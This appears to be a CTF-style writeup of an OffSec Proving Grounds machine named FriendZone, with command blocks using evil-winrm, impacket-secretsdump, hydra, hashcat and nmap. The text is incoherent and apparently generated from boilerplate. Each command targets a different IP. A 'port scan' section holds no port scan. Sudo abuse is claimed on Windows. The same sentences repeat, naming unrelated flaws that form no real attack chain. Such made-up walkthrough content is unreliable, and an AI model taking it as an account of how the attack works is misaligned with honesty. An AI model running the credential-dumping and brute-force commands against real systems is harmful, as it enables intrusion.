---
TitleSEO: "OffSec Proving Grounds — FriendZone (Insane Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — FriendZone (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds FriendZone. ACL Abuse and XSS to achieve insane compromise on Windows."
Keywords: "windows, reversing, web, offsec, linux"
URL: "https://zurefx.github.io/writeups/htb-friendzone-434.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-friendzone-434/"
Date: "2025-11-18"
Tags: "Windows, Reversing, Web, OffSec, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-friendzone-434"
Permalink: "/writeups/htb-friendzone-434.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **FriendZone** is rated **Insane** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.124.164.55`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.77.242.2 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.112.212.34 -u administrator -p 'P@ssw0rd!'
```

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.2.210
nmap -sCV -p3268,995,23 10.97.60.188 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.188.127
```

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

### Web Enumeration

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.90.165.62/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **XSS**.

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

### Initial Access

The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.108.192.168 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.64.178.185/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
nmap -sCV -p23,995,1521 10.70.106.227 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `rubeus`
- `john`
- `secretsdump`
- `wpscan`
- `GetNPUsers`
- `feroxbuster`
- `metasploit`
- `chisel`

### Key Takeaways

- ACL Abuse
- XSS
- DCSync
